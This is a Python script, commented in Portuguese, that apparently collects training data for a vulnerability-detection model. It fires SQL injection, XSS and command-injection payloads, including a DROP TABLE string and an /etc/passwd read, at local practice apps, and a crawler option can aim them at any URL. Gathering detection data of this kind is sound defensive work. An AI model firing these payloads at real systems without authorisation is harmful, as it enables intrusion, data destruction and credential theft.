#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Script para coletar exemplos de vulnerabilidades para treinamento do PenteIA

Este script automatiza o processo de coleta de dados para treinamento do modelo
de detecção de vulnerabilidades. Ele se conecta a ambientes de teste (DVWA, WebGoat, etc.)
e coleta exemplos de vulnerabilidades.
"""

import os
import sys
import json
import time
import random
import requests
import pandas as pd
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
from datetime import datetime
from colorama import init, Fore, Style

# Inicializa colorama
init(autoreset=True)

# Garante saída UTF-8 no terminal (evita erros no console do Windows / cp1252)
import sys as _sys
try:
    _sys.stdout.reconfigure(encoding="utf-8")
    _sys.stderr.reconfigure(encoding="utf-8")
except Exception:
    pass

# Configurações globais
SESSION = requests.Session()
OUTPUT_DIR = "dados_treinamento"
OUTPUT_FILE = os.path.join(OUTPUT_DIR, f"dados_coletados_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv")
CONFIG_FILE = "exemplos/config_coleta.json"

def carregar_config():
    """Carrega a configuração para coleta de dados"""
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        else:
            # Criar config padrão
            config = {
                "alvos": [
                    {
                        "nome": "DVWA",
                        "url": "http://localhost/DVWA/",
                        "auth": {
                            "login_url": "http://localhost/DVWA/login.php",
                            "campos": {"username": "admin", "password": "password", "Login": "Login"}
                        },
                        "páginas": [
                            "vulnerabilities/sqli/?id=1&Submit=Submit",
                            "vulnerabilities/xss_r/?name=test",
                            "vulnerabilities/exec/?ip=127.0.0.1&Submit=Submit"
                        ]
                    },
                    {
                        "nome": "WebGoat",
                        "url": "http://localhost:8080/WebGoat/",
                        "auth": {
                            "login_url": "http://localhost:8080/WebGoat/login",
                            "campos": {"username": "guest", "password": "guest"}
                        },
                        "páginas": [
                            "start.mvc#lesson/SqlInjection.lesson",
                            "start.mvc#lesson/CrossSiteScripting.lesson"
                        ]
                    },
                    {
                        "nome": "JuiceShop",
                        "url": "http://localhost:3000/",
                        "páginas": [
                            "rest/products/search?q=apple",
                            "rest/user/login",
                            "api/Products"
                        ]
                    }
                ],
                "payloads": {
                    "sqli": [
                        "' or 1=1--",
                        "1' UNION SELECT 1,2,3--",
                        "admin'--",
                        "1' OR '1'='1'",
                        "1'; DROP TABLE users--",
                        "1' UNION SELECT @@version--"
                    ],
                    "xss": [
                        "<script>alert(1)</script>",
                        "<img src=x onerror=alert(2)>",
                        "<svg onload=alert('XSS')>",
                        "<iframe src=javascript:alert(3)>",
                        "javascript:alert(document.cookie)"
                    ],
                    "cmd_injection": [
                        "127.0.0.1; ls",
                        "$(whoami)",
                        "`id`",
                        "127.0.0.1 | cat /etc/passwd",
                        "127.0.0.1 && dir"
                    ]
                },
                "tempos": {
                    "entre_requisições": 1.0,
                    "timeout": 10
                }
            }

            os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
            with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
                json.dump(config, f, indent=4, ensure_ascii=False)

            print(f"{Fore.GREEN}[+] Arquivo de configuração criado em {CONFIG_FILE}")
            return config
    except Exception as e:
        print(f"{Fore.RED}[!] Erro ao carregar configuração: {str(e)}")
        sys.exit(1)

def descobrir_urls(base_url, max_paginas=50, profundidade=2, recursivo=False, timeout=10):
    """
    Descobre páginas com parâmetros (pontos de injeção) a partir de uma URL base.
    Faz um crawling limitado ao mesmo domínio. Retorna uma lista de URLs completas.
    """
    print(f"{Fore.BLUE}[*] Descobrindo URLs a partir de {base_url} "
          f"(profundidade={profundidade if recursivo else 1}, max={max_paginas})...")

    base_netloc = urlparse(base_url).netloc
    visitados = set()
    com_parametros = []
    # fila de (url, nivel)
    fila = [(base_url, 0)]

    while fila and len(visitados) < max_paginas:
        url_atual, nivel = fila.pop(0)
        if url_atual in visitados:
            continue
        visitados.add(url_atual)

        try:
            resp = SESSION.get(url_atual, timeout=timeout)
        except Exception:
            continue

        # Guarda URLs que tenham parâmetros de query (candidatas a injeção)
        if urlparse(url_atual).query and url_atual not in com_parametros:
            com_parametros.append(url_atual)

        # Só segue links se o crawling recursivo estiver ativo e dentro da profundidade
        nivel_max = profundidade if recursivo else 1
        if nivel >= nivel_max:
            continue

        try:
            soup = BeautifulSoup(resp.text, 'html.parser')
        except Exception:
            continue

        for a in soup.find_all('a', href=True):
            href = a['href']
            if href.startswith(('#', 'javascript:', 'mailto:')):
                continue
            full = urljoin(url_atual, href)
            if urlparse(full).netloc != base_netloc:
                continue
            if full not in visitados:
                fila.append((full, nivel + 1))

    print(f"{Fore.GREEN}[+] Descoberta concluída: {len(visitados)} páginas visitadas, "
          f"{len(com_parametros)} com parâmetros")
    # Se nada com parâmetros foi achado, ao menos devolve a própria base
    return com_parametros if com_parametros else [base_url]


def autenticar(alvo):
    """Realiza autenticação no alvo se necessário"""
    if "auth" not in alvo:
        print(f"{Fore.YELLOW}[*] Nenhuma autenticação configurada para {alvo['nome']}")
        return True

    try:
        print(f"{Fore.BLUE}[*] Autenticando em {alvo['nome']}...")

        auth_config = alvo["auth"]
        login_url = auth_config["login_url"]
        campos = auth_config["campos"]

        # Envia requisição de login
        response = SESSION.post(
            login_url,
            data=campos,
            timeout=10
        )

        if response.status_code == 200:
            print(f"{Fore.GREEN}[+] Autenticação em {alvo['nome']} bem-sucedida!")
            return True
        else:
            print(f"{Fore.RED}[!] Falha na autenticação em {alvo['nome']}. Código: {response.status_code}")
            return False
    except Exception as e:
        print(f"{Fore.RED}[!] Erro durante autenticação em {alvo['nome']}: {str(e)}")
        return False

def testar_payload(url, payload, tipo_payload, session):
    """Testa um payload em uma URL"""
    try:
        # Identifica onde inserir o payload
        parsed_url = urlparse(url)
        path = parsed_url.path
        query = parsed_url.query

        # Se há parâmetros na query, substitui o valor do primeiro por payload
        if query:
            params = {}
            for param in query.split('&'):
                if '=' in param:
                    key, value = param.split('=', 1)
                    params[key] = value

            # Pega o primeiro parâmetro e substitui pelo payload
            first_param = list(params.keys())[0]
            params[first_param] = payload

            # Reconstrói a URL
            new_query = '&'.join([f"{k}={v}" for k, v in params.items()])
            new_url = f"{parsed_url.scheme}://{parsed_url.netloc}{path}?{new_query}"
        else:
            # Se não há parâmetros, apenas adiciona o payload ao final
            new_url = url

        print(f"{Fore.BLUE}[*] Testando payload {tipo_payload}: {payload}")

        # Faz a requisição
        response = session.get(new_url, timeout=10)

        # Verifica se o payload foi bem-sucedido (aqui é apenas uma heurística simples)
        success = False

        # Verificações específicas por tipo de payload
        if tipo_payload == "sqli":
            success = (
                "SQL syntax" in response.text or
                "mysql" in response.text.lower() or
                "sqlite" in response.text.lower() or
                "error in your SQL syntax" in response.text or
                "UNION SELECT" in response.text or
                "administrator" in response.text.lower() and "password" in response.text.lower()
            )
        elif tipo_payload == "xss":
            success = (
                "<script>" in response.text or
                "alert" in response.text or
                "onerror" in response.text
            )
        elif tipo_payload == "cmd_injection":
            success = (
                "uid=" in response.text or
                "gid=" in response.text or
                "root:" in response.text or
                "Directory of" in response.text or
                "Volume Serial Number" in response.text
            )

        # Determina rótulo (label) com base no sucesso
        # 1 = vulnerável, 0 = não vulnerável
        label = 1 if success else 0

        return {
            "url": new_url,
            "payload": payload,
            "tipo_payload": tipo_payload,
            "text": response.text,
            "status_code": response.status_code,
            "label": label,
            "success": success
        }

    except Exception as e:
        print(f"{Fore.RED}[!] Erro ao testar payload {payload}: {str(e)}")
        return None

def coletar_dados(config):
    """Coleta dados de vulnerabilidades dos alvos"""
    resultados = []
    total_testes = 0

    # Para cada alvo
    for alvo in config["alvos"]:
        print(f"\n{Fore.GREEN}[+] Coletando dados de {alvo['nome']}")

        # Verifica se o alvo está acessível
        try:
            SESSION.get(alvo["url"], timeout=5)
        except Exception:
            print(f"{Fore.RED}[!] Alvo {alvo['nome']} não está acessível. Pulando...")
            continue

        # Autentica se necessário
        if not autenticar(alvo):
            continue

        # Para cada página do alvo
        for pagina in alvo["páginas"]:
            url_completa = urljoin(alvo["url"], pagina)
            print(f"\n{Fore.BLUE}[*] Testando página: {url_completa}")

            # Para cada tipo de payload
            for tipo_payload, payloads in config["payloads"].items():
                for payload in payloads:
                    # Espera entre requisições para não sobrecarregar o servidor
                    time.sleep(config["tempos"]["entre_requisições"])

                    # Testa o payload
                    resultado = testar_payload(url_completa, payload, tipo_payload, SESSION)

                    if resultado:
                        resultados.append(resultado)
                        total_testes += 1

                        # Exibe resultado
                        status = f"{Fore.GREEN}[VULNERÁVEL]" if resultado["success"] else f"{Fore.BLUE}[NÃO VULNERÁVEL]"
                        print(f"  {status} {resultado['url']} - {resultado['payload']}")

    print(f"\n{Fore.GREEN}[+] Total de testes realizados: {total_testes}")
    print(f"{Fore.GREEN}[+] Total de resultados coletados: {len(resultados)}")

    return resultados

def salvar_resultados(resultados):
    """Salva os resultados em um arquivo CSV"""
    try:
        # Cria diretório se não existir
        os.makedirs(OUTPUT_DIR, exist_ok=True)

        # Converte para DataFrame
        df = pd.DataFrame(resultados)

        # Seleciona apenas as colunas necessárias para treinamento
        df_treino = df[['text', 'label', 'tipo_payload']]

        # Salva em CSV
        df_treino.to_csv(OUTPUT_FILE, index=False)

        # Atualiza/cria o arquivo dados_processados.csv
        processed_file = os.path.join(OUTPUT_DIR, "dados_processados.csv")

        # Se já existe, concatena com os novos dados
        if os.path.exists(processed_file):
            df_existente = pd.read_csv(processed_file)
            df_combinado = pd.concat([df_existente, df_treino], ignore_index=True)
            df_combinado.to_csv(processed_file, index=False)
        else:
            df_treino.to_csv(processed_file, index=False)

        print(f"\n{Fore.GREEN}[+] Resultados salvos em {OUTPUT_FILE}")
        print(f"{Fore.GREEN}[+] Dados de treinamento atualizados em {processed_file}")

        # Exibe estatísticas
        total = len(df)
        vulneraveis = df['label'].sum()
        taxa = (vulneraveis / total) * 100 if total > 0 else 0

        print(f"\n{Fore.BLUE}[*] Estatísticas:")
        print(f"  - Total de amostras: {total}")
        print(f"  - Vulneráveis: {vulneraveis} ({taxa:.2f}%)")
        print(f"  - Não vulneráveis: {total - vulneraveis} ({100 - taxa:.2f}%)")

        # Estatísticas por tipo de payload
        print(f"\n{Fore.BLUE}[*] Estatísticas por tipo de payload:")
        for tipo in df['tipo_payload'].unique():
            df_tipo = df[df['tipo_payload'] == tipo]
            total_tipo = len(df_tipo)
            vuln_tipo = df_tipo['label'].sum()
            taxa_tipo = (vuln_tipo / total_tipo) * 100 if total_tipo > 0 else 0

            print(f"  - {tipo}: {total_tipo} amostras, {vuln_tipo} vulneráveis ({taxa_tipo:.2f}%)")

        return True
    except Exception as e:
        print(f"{Fore.RED}[!] Erro ao salvar resultados: {str(e)}")
        return False

def main():
    """Função principal"""
    import argparse
    parser = argparse.ArgumentParser(description='PenteIA - Coleta avançada de dados para treinamento')
    parser.add_argument('--url', '-u', help='URL base para coleta (ignora os alvos do config)')
    parser.add_argument('--config', '-c', help='Arquivo de configuração (default: exemplos/config_coleta.json)')
    parser.add_argument('--discover', '-d', action='store_true', help='Descobrir páginas com parâmetros automaticamente')
    parser.add_argument('--recursive', '-r', action='store_true', help='Crawling recursivo de links')
    parser.add_argument('--depth', '-dp', type=int, default=2, help='Profundidade do crawling recursivo (default=2)')
    parser.add_argument('--max-pages', '-mp', type=int, default=50, help='Máximo de páginas a explorar (default=50)')
    parser.add_argument('--timeout', '-t', type=int, default=10, help='Timeout das requisições em segundos')
    parser.add_argument('--yes', '-y', action='store_true', help='Não pedir confirmação (modo automático)')
    args = parser.parse_args()

    print(f"{Fore.CYAN}===== PenteIA - Coleta de Dados para Treinamento =====")
    print(f"{Fore.YELLOW}Este script coleta dados para treinar o modelo de IA.\n")

    # Permite sobrescrever o arquivo de configuração
    global CONFIG_FILE
    if args.config:
        CONFIG_FILE = args.config

    # Carrega configuração
    config = carregar_config()

    # Garante a chave de tempos
    config.setdefault("tempos", {"entre_requisições": 1.0, "timeout": args.timeout})
    config["tempos"]["timeout"] = args.timeout

    # Se uma URL foi passada, monta os alvos a partir dela (com descoberta opcional)
    if args.url:
        if args.discover:
            paginas = descobrir_urls(args.url, max_paginas=args.max_pages,
                                     profundidade=args.depth, recursivo=args.recursive,
                                     timeout=args.timeout)
        else:
            paginas = [args.url]
        config["alvos"] = [{"nome": "alvo-personalizado", "url": args.url, "páginas": paginas}]

    # Aviso
    print(f"{Fore.RED}\nATENÇÃO: Este script enviará payloads potencialmente maliciosos")
    print(f"{Fore.RED}         para os alvos configurados. Use APENAS em ambientes")
    print(f"{Fore.RED}         controlados e com permissão explícita.")

    # Confirmação (pulada com --yes)
    if not args.yes:
        if input(f"\n{Fore.YELLOW}Deseja continuar? (S/N): ").strip().upper() != 'S':
            print(f"{Fore.BLUE}Operação cancelada.")
            return

    try:
        # Coleta dados
        resultados = coletar_dados(config)

        # Salva resultados
        if resultados:
            salvar_resultados(resultados)
            print(f"\n{Fore.GREEN}[+] Coleta de dados concluída com sucesso!")
            print(f"{Fore.GREEN}[+] Agora você pode treinar o modelo com:")
            print(f"{Fore.GREEN}    python treinar_modelo_real.py")
        else:
            print(f"\n{Fore.YELLOW}[!] Nenhum dado foi coletado.")

    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Operação interrompida pelo usuário.")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Erro durante a coleta de dados: {str(e)}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
